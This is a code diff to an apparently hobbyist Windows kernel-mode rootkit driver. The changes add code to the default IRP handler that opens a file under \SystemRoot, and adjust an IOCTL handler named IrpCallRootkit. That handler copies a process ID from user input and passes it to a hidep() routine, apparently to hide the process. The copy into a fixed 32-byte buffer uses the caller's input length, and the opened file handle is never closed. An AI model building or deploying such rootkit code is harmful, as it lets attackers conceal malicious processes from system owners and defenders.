@@ -3,6 +3,31 @@
 
 NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {
 
+	NTSTATUS ntstatus = STATUS_SUCCESS;
+	/////////////////////// THIS SECTION /////////////////////////////////////
+	UNICODE_STRING     uniName;
+	OBJECT_ATTRIBUTES  objAttr;
+	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
+	RtlInitUnicodeString(&uniName, L"\\SystemRoot\\proop.txt");  // or L"\\SystemRoot\\example.txt"
+	InitializeObjectAttributes(&objAttr, &uniName,
+		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+		NULL, NULL);
+	//////////////////////////////////
+
+	///////////////////////////////////
+	//Load the buffer (ie. contents of text file to the console)
+	HANDLE handle;
+	IO_STATUS_BLOCK    ioStatusBlock;
+	ntstatus = ZwCreateFile(&handle,
+		GENERIC_READ,
+		&objAttr, &ioStatusBlock,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+		FILE_OPEN,
+		FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL, 0);
+
 	UNREFERENCED_PARAMETER(DeviceObject);
 
 	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
@@ -15,13 +40,12 @@ NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessag
 
 NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 
-	UNREFERENCED_PARAMETER(DeviceObject);
 
-	PIO_STACK_LOCATION  irpSp;
+	UNREFERENCED_PARAMETER(DeviceObject);
 
 	ULONG inBufferLength, outBufferLength, requestCode;
 
-	irpSp = IoGetCurrentIrpStackLocation(Irp);
+	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
 
 	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
 	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
@@ -29,17 +53,20 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 
 	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
 
-	Irp->IoStatus.Information = inBufferLength;
-
 	if (requestCode != IRP_ROOTKIT_CODE) {
 		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
+		IoCompleteRequest(Irp, IO_NO_INCREMENT);
 		return Irp->IoStatus.Status;
 	}
 
+	Irp->IoStatus.Information = inBufferLength;
+
 	char pid[32];
 	strcpy_s(pid, inBufferLength, inBuf);
-
+	 
 	hidep(atoi(pid));
+
+	
 
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
